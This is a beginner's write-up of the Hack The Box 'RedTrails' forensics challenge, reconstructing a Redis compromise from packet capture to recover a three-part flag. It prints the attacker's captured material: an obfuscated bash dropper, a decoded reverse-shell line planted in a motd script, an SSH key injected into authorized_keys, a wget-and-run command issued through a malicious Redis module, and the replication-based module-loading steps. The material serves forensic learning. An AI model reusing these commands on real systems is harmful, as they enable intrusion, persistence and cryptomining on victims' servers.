Link: https://app.hackthebox.com/challenges/RedTrails?tab=play_challenge
#RedTrails

## Author: Nauten
### Difficulty: Medium
## Description: 
Our SOC team detected a suspicious activity on one of our redis instance. Despite the fact it was password protected it seems that the attacker still obtained access to it. We need to put in place a remediation strategy as soon as possible, 
to do that it's necessary to gather more informations about the attack used. NOTE: flag is composed by three parts.

### Tools used:
- Kali Linux VM (Oracle VirtualBox)
- Wireshark
- Cyberchef
## Solution:
We are given a ```capture.pcap``` file containing TCP, HTTPS, TLS, and RESP protocol traffic. The RESP protocol is used in Redis databases, so the main information we need can be found there.
First of all I filtered only RESP traffic, where I noticed, that someone got all users credentials table by using ```HGETALL``` command. When I followed a TCP stream to checkout the array with users credentials I found a part of the flag.

<img width="315" height="139" alt="image" src="https://github.com/user-attachments/assets/69031a03-a004-4103-9ebb-078612c1f0f1" />

So, now we have ```..._c0uld_0p3n_n3w...```, let's inspect further.

To find other parts of the flag we need to understand the sequance of Redis explotation:
1. Attacker loged in using the 1943567864 password. Sadly, we cannot know how attacker gained this password.
2. Attacker used ```KEYS *``` to find all keys in Redis.
3. Gained credentials of all users by extracting data from hash with ```HGETALL user_table``` command hash.
4. Added new keys, which load malicious scripts.
5. Set Redis as a slave of ```10.10.0.15 6379```.
6. Set db name to ```x10SPFHN.so``` with ```CONFIG SET dbfilename x10SPFHN.so```.
7. Pushed a malicious module using replication, so it copied the attackers Redis instance.
8. Loaded the malicious module with ```MODULE LOAD ./x10SPFHN.so```.
9. Set Redis to standalone mode with ```SLAVEOF NO ONE```.
10. Changed the dump file name to ```dump.rdb```.
11. Executed the module and got some encrypted response.
12. Unloaded the module.

Now let's inspect the TCP stream 1, where the malicious code had been uploaded.
```
GET /packages/VgLy8V0Zxo HTTP/1.1
Host: files.pypi-install.com
User-Agent: Wget
Connection: close


HTTP/1.1 200 OK
Date: Mon, 06 Nov 2023 15:11:30 GMT
Server: Apache/2.4.54 (Debian)
Last-Modified: Mon, 06 Nov 2023 15:08:53 GMT
ETag: "959-6097d3b79b941"
Accept-Ranges: bytes
Content-Length: 2393
Connection: close

gH4="Ed";kM0="xSz";c="ch";L="4";rQW="";fE1="lQ";s=" '==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
' | r";HxJ="s";Hc2="";f="as";kcE="pas";cEf="ae";d="o";V9z="6";P8c="if";U=" -d";Jc="ef";N0q="";v="b";w="e";b="v |";Tx="Eds";xZp=""
x=$(eval "$Hc2$w$c$rQW$d$s$w$b$Hc2$v$xZp$f$w$V9z$rQW$L$U$xZp")
eval "$N0q$x$Hc2$rQW"
```
Here is some interesting thing: there is encrypted text, which looks like Base64, but the '=' character, which usualy appear in the end is located in the beginning !
So I fliped the text backwards and decoded it from base 64 and got some obfuscated bash script.
```
#!/bin/bash

lhJVXukWibAFfkv() {
	ABvnz='ZWNobyAnYmFzaCAtYyAiYmFzaCAtaSA+JiAvZGV2L3R'
	QOPjH='jcC8xMC4xMC4wLjIwMC8xMzM3IDA+JjEiJyA+IC9'
	gQIxX='ldGMvdXBkYXRlLW1vdGQuZC8wMC1oZWFkZXIK'
    echo "$ABvnz$QOPjH$gQIxX" | base64 --decode | bash
}

x7KG0bvubT6dID2() {
	LQebW="ZWNobyAtZSAiXG5zc2gtcnNhIEFBQUFCM056YUMxeWMyRUFBQUFEQVFBQkFBQUNBUUM4VmtxOVVUS01ha0F4MlpxK1BuWk5jNm5ZdUVL"
	gVR7i="M1pWWHhIMTViYlVlQitlbENiM0piVkp5QmZ2QXVaMHNvbmZBcVpzeXE5Smc2L0tHdE5zRW10VktYcm9QWGh6RnVtVGdnN1oxTnZyVU52"
	bkzHk="bnFMSWNmeFRuUDErLzRYMjg0aHAwYkYyVmJJVGI2b1FLZ3pSZE9zOEd0T2FzS2FLMGsvLzJFNW8wUktJRWRyeDBhTDVIQk9HUHgwcDhH"
	q97up="ckdlNGtSS29Bb2tHWHdEVlQyMkxsQnlsUmtBNit4NmpadGQyZ1loQ01nU1owaU05UnlZN2s3SzEzdEhYekVrN09jaVVtZDUvWjdZdW9s"
	GYJan="bnQzQnlYOWErSWZMTUQvRlFOeTFCNERZaHNZNjJPN28yeFIwdnhrQkVwNVVoQkFYOGdPVEcwd2p6clVIeG1kVWltWGdpeTM5WVZaYVRK"
	HJj6A="UXdMQnR6SlMvL1loa2V3eUYvK0NQMEg3d0lLSUVybGY1V0ZLNXNrTFlPNnVLVnB4NmFrR1hZOEdBRG5QVTNpUEsvTXRCQytScVdzc2Rr"
	fD9Kc="R3FGSUE1eEcyRm4rS2xpZDlPYm0xdVhleEpmWVZqSk1PZnZ1cXRiNktjZ0xtaTV1UmtBNit4NmpadGQyZ1loQ01nU1owaU05UnlZN2s3"
	hpAgs="SzEzdEhYekVrN09jaVVtZDUvWjdZdW9sbnQzQnlYOWErSWxTeGFpT0FEMmlOSmJvTnVVSXhNSC85SE5ZS2Q2bWx3VXBvdnFGY0dCcVhp"
	FqOPN="emNGMjFieE5Hb09FMzFWZm94MmZxMnFXMzBCRFd0SHJyWWk3NmlMaDAyRmVySEVZSGRRQUFBMDhOZlVIeUN3MGZWbC9xdDZiQWdLU2Iw"
	CpJLT="Mms2OTFsY0RBbzVKcEVFek5RcHViMFg4eEpJdHJidz09SFRCe3IzZDE1XzFuNTc0bmMzNSIgPj4gfi8uc3NoL2F1dGhvcml6ZWRfa2V5"
	PIx1p="cw=="
	echo "$LQebW$gVR7i$bkzHk$q97up$GYJan$HJj6A$fD9Kc$hpAgs$FqOPN$CpJLT$PIx1p" | base64 --decode | bash
}

hL8FbEfp9L1261G() {
	lhJVXukWibAFfkv
	x7KG0bvubT6dID2
}

hL8FbEfp9L1261G

```
I tried to decode all code from base 64, but it gave no result, so I decoded only values of variables and got other part of the flag.
```
echo 'bash -c "bash -i >& /dev/tcp/10.10.0.200/1337 0>&1"' > /etc/update-motd.d/00-header
echo -e "\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQC8Vkq9UTKMakAx2Zq+PnZNc6nYuEK3ZVXxH15bbUeB+elCb3JbVJyBfvAuZ0sonfAqZsyq9Jg6/KGtNsEmtVKXroPXhzFumTgg7Z1NvrUNvnqLIcfxTnP1+/4X284hp0bF2VbITb6oQKgzRdOs8GtOasKaK0k//2E5o0RKIEdrx0aL5HBOGPx0p8GrGe4kRKoAokGXwDVT22LlBylRkA6+x6jZtd2gYhCMgSZ0iM9RyY7k7K13tHXzEk7OciUmd5/Z7Yuolnt3ByX9a+IfLMD/FQNy1B4DYhsY62O7o2xR0vxkBEp5UhBAX8gOTG0wjzrUHxmdUimXgiy39YVZaTJQwLBtzJS//YhkewyF/+CP0H7wIKIErlf5WFK5skLYO6uKVpx6akGXY8GADnPU3iPK/MtBC+RqWssdkGqFIA5xG2Fn+Klid9Obm1uXexJfYVjJMOfvuqtb6KcgLmi5uRkA6+x6jZtd2gYhCMgSZ0iM9RyY7k7K13tHXzEk7OciUmd5/Z7Yuolnt3ByX9a+IlSxaiOAD2iNJboNuUIxMH/9HNYKd6mlwUpovqFcGBqXizcF21bxNGoOE31Vfox2fq2qW30BDWtHrrYi76iLh02FerHEYHdQAAA08NfUHyCw0fVl/qt6bAgKSb02k691lcDAo5JpEEzNQpub0X8xJItrbw==
HTB{r3d15_1n574nc35" >> ~/.ssh/authorized_key
```
After I inspected all remaining traffic one piece of encoded string caught my attention. I found it in TCP stream 2, which is related to the main part of the attack. This text appears right after attacker installs some malicious script.

```
*2
$11
system.exec
$113
wget --no-check-certificate -O gezsdSC8i3 'https://files.pypi-install.com/packages/gezsdSC8i3' && bash gezsdSC8i3

$960
394810bbd00d01baa64e1da65ad18dcbe7d1ca585d429847e0fe1c4f76ff3cf49fcc4943e9dd339c5cbac2fd876c21d37b4ea3c014fe679f81cd9a546a7a324c6958b87785237671b3331ae9a54d126f78c916de74c154a1915a963edffdb357af5d7cfdb85b200fdeb35f4f508367081e31e3094c15e2a683865bb05b04a36b19202ab49c5ebffcec7698d5f2e344c5d9da608c5c2506c689c1fc4a492bec4dd4db33becb17d631c0fdd7e642c20ffa7e987d2851c532e77bdfb094c0cfcd228499c57ea257f305c367b813bc4d4cf937136e02398ce7cb3c26f16f3c6fc22a2b43795d41260b46d8bdf0432aaefbcc863880571952510bf3d98919219ab49e86974f11a81fff5ff85734601e79c2c2d754e3fe7a6cfcec8349ceb350ea7145f87b86f7e65543268c8ae76cb54bef1885b01b222841da59a377140ae6bd544cc47ac550a865af84f5b31df6a21e7816ed163260f47ea16a64f153be1399911a99fd71b30689b961477db551c9bc2cdc1aa6b931ba2852af1e297ee66fb99381ab916b377358243152f1f3abba9f7ad700ba873b53dc2f98642f47580d7ef5d3e3b32b3c4a9a53689c68a5911a6258f2da92ca30661ebef77109e1e44f3aa6665f6734af7d3d721201e3d31c61d4da562cef34f66dd7f88fb639b2aaf4444952

```

However, i did not know how to decode this string: it is not base 64 or hexadecimal encoding. So, I checked for any hints in the traffic. 
After a long time I found something in TCP Stream 6. A hint was in the list of configurations, which were applied by an attacker. 
```
EVP_aes_256_cbc.EVP_EncryptInit_ex.EVP_EncryptUpdate.EVP_EncryptFinal_ex.EVP_CIPHER_CTX_free.snprintf.pclose.__stack_chk_fail.RedisModule_OnLoad.libc.so.6.GLIBC_2.7.GLIBC_2.4.GLIBC_2.2.5
```
So it might be an AES 256 encryption, but now I needed to find a key and IV to decode the string.
It did not take much time, because the only strings that fitted were in the end of the config list.
```
h02B6aVgu09Kzu9QTvTOtgx9oER9WIoz.YDP7ECjzuV7sagMN.%02x.system.readonly.system.exe
```
In AES key usualy 32 bytes long and IV is 16 bytes long, so the string before the period perfectly fits the key and string after the period fits the IV.
Key: h02B6aVgu09Kzu9QTvTOtgx9oER9WIoz
IV: YDP7ECjzuV7sagMN.%02x

```
--- Installing ethminer ---
--- Enabling automatically startup ---


--- Setting env ---
ETHMINER_PATH=/tmp/ethminer
HOSTNAME=redis-master
REDIS_DOWNLOAD_SHA=5c76d990a1b1c5f949bcd1eed90d0c8a4f70369bdbdcb40288c561ddf88967a4
PWD=/data
HOME=/root
REDIS_VERSION=7.2.1
REDIS_DOWNLOAD_URL=http://download.redis.io/releases/redis-7.2.1.tar.gz
SHLVL=4
FLAG_PART=_un3xp3c73d_7r41l5!}
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
_=/usr/bin/env


--- Success! ---
```
And now we have the last part of the flag.
So the flag is **HTB{r3d15_1n574nc35_c0uld_0p3n_n3w_un3xp3c73d_7r41l5!}**

This challenge indluded various activities such as network packet analysys, script deobfuscating and cryptography. I studied a lot about databases security risks. 
Due to my lack of experience it took me about 4 hours to solve this task. It also teached me that the info, that doesn't look important might be crucial for the whole job. For me as a beginner some staff was not really obvious and clear, but with help of internet I solved this really interesting challenge.


